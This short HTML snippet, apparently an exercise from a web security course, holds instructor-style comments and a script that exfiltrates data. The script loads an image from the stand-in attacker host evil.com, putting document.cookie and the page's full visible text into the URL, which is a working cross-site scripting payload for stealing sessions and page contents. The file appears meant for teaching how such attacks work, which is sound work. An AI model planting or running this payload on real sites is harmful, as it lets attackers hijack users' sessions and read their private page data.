<!--
🐨 In addition to document.cookie, also send the contents of page
💰 document.cookie + " " + document.body.innerText
-->

<script>
  const img = new Image();
  img.src = `https://evil.com:666/hijack?payload=${encodeURIComponent(
    document.cookie + " " + document.body.innerText
  )}`;
</script>
